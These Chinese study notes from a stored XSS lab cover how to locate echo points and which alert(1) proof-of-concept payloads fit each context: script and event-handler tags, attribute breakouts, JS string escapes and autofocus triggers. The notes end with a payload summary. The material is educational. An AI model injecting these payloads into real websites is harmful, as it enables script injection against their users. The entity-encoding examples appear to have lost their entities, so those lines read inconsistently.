# Day12学习笔记

**日期**：2025.10.23
**目标**：完成一个stored xss lab，输出一篇writeup

---

## stored xss 如何注入：
- 先找回显点（Echo point）：确定用户输入在哪里显示——三类常见位置：
	- HTML body（文本节点）：`<div>用户输入</div>`
	- Attribute（属性）：`<a href="用户输入">`、`<div title="用户输入">`
	- JS string（脚本字符串）：`<script>var a = "用户输入";</script>`
- 注：提交评论后通常会 302 重定向，回显信息不在提交响应里，要抓取刷新/帖子详情页（GET）或 XHR 的响应来定位回显。

---

## xss注入方法：

### HTML body（文本节点 / body 内）：
- 回显示例（Elements）：`<p>user input here</p>`
- 判定：`innerHTML` 会显示原始标签或实体。
	- `innerHTML` / `textContent`是两个 JavaScript 属性，用来读取或写入页面元素的内容;
	- `innerHTML`可能会把`'<img src=x onerror=alert(1)>'`当成脚本执行
	-  `textContent`（或innerText）会以纯文本形式读/写，不会解析为 HTML
- 常用 payload（需要 `<` `>`）：
- `<script>alert(1)</script>`（直接脚本）
	- 有时HTML会过滤`<script>`（`<script>``</script>`是一对标签，代表执行标签内的js代码），这时需要尝试以下方法
- `<img src=x onerror=alert(1)>`（事件型）
- `<svg onload=alert(1)></svg>`（事件型）
- 基础知识：这些 payload 依赖浏览器把 `<...>` 解析成标签。若页面把 `<` 进行转义或删除，就不会执行。

### Attribute（属性上下文：例如 `href="..."` `title="..."`）：
- 回显示例：`<a href="user_input">name</a>` 或 `<div title="user_input">`
- 判定：在 Elements 里看属性值。
- 常用 payload（不总需要 `<`）：
- `javascript:alert(1)`（href 协议注入，点击执行）
	- 只适用于`href`属性，`javascript:`是一串伪协议，强制网页以javascript的形式运行后面的内容，即`alert(1)`
- `"><svg onload=alert(1)><!--`（属性闭合注入：先闭合属性再插入新标签）
	- `<!--`是HTML的注释符，与`-->`配套使用，前者标示注释开头，后者标示注释结尾`<!--这是一段注释-->`
	- 在这里故意仅使用注释符的前半段，目的是把后续内容注释掉不干扰注入内容
- `'" onmouseover=alert(1) x="`（闭合并插入事件属性）
	- `onmouseover`的含义为鼠标放在指定位置时执行相应操作
- 基础知识：属性值里若被 HTML 实体化（`"`）即`"`被转义，则闭合方法可能被破坏。

### JS string（被拼进脚本字符串里，如 `<script>var a = "USER";</script>`）：
- 判定：在 raw HTML 中看到字符串拼接位置或在 Elements 找到 `<script>` 包含输入。
- 常用 payload（不含尖括号，靠闭合引号）：
- `";alert(1);//`（双引号场景）
- `');alert(1);//`（单引号场景）
- 基础知识：目的是“跳出”字符串并执行代码，然后注释掉剩余页面代码避免语法错误。

### AJAX / JSON → 前端再渲染：
- 判定：Network → XHR，看是否有请求返回 JSON 并被前端插入。再看前端是否用 `innerHTML` 或 `textContent`。
- 常用 payload：同 HTML body / attribute，取决于前端如何插入（innerHTML 则可用 `<img>`；textContent 则无效）。

---

## payload一览：
### HTML body（文本节点）：
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)></svg>`

### Attribute（属性）：
- `javascript:alert(1)`  — 放 `href`，无需尖括号
- `"><svg onload=alert(1)><!--` — 属性闭合后插入 SVG
- `'" onmouseover=alert(1) x="` — 属性闭合并插入事件

### JS string：
- `";alert(1);//`
- `');alert(1);//`

### 二次解码测试：
- `<script>alert(1)</script>` — 看前端/后端是否会把实体再解码回 `<script>`

### 自动触发替代（当点击不好用时）：
- `<input autofocus onfocus=alert(1)>` — 页面加载后自动 focus 触发（某些场景有效）